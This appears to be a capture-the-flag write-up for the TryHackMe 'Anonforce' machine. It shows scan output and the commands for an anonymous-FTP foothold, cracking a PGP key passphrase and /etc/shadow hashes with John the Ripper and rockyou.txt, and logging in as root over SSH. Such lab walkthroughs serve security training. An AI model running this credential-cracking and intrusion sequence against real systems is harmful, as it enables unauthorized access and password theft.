```bash
# PLATFORM          . THM
# CTF NAME          . Anonforce
# DESCRIPTION       . boot2root machine for FIT and bsides guatemala CTF
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/bsidesgtanonforce
```

```
sudo nmap -sSVC -T5 -p- 10.10.49.218 -oN anonforce
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.11.53.46
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Jan 08 22:14 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x  101 0        0               0 Jan 08 22:14 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Jan 08 22:14 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Jan 08 22:14 sys
|_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8af9483e11a1aafcb78671d02af624e7 (RSA)
|   256 735dde9a886e647ae187ec65ae1193e3 (ECDSA)
|_  256 56f99f24f152fc16b77ba3e24f17b4ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

#### PORT 21 

- FTP seems to contain the entire file system.

- We're able to get the flag from `/home/melodias/user.txt`.

- Also, in the root directory we can see a directory that doesn't belong to the file system hierarchy by default and to which we have full access: `notread`.

- This contains 2 files, a PGP encrypted-file and its key.

- I've downloaded them both and did the following steps to reveal the content of the .pgp file

```
gpg --import private.asc
```

- But this failed as it asked for a passphase which I didn't had.

```bash
# extract the hash of the .asc file to a format readable by john.
/opt/john/run/gpg2john private.asc > hash

# bruteforce the passphase against the rockyou.txt wordlist
/opt/john/run/john hash -w=/usr/share/wordlists/rockyou.txt
```

```
x{REDACTED}0          (anonforce)     
```

- Now that we got the passphase, we can import the key and decrypt the pgp file

```
pgp --import private.asc
pgp --decrypt backup.pgp 
```

- This revealed the content of `/etc/shadow` file (that hopefully is still unaltered on the server, since this is a 'backup'.)

- What I did next was to save the content in a file and use john to try to bruteforce the hashes.

```
/opt/john/run/john shadow -w=/usr/share/wordlists/rockyou.txt
```

```
h{redacted}i           (root)     
```

- SSH into the box using the credentials above.

- The last flag is located in `/root/root.txt`.

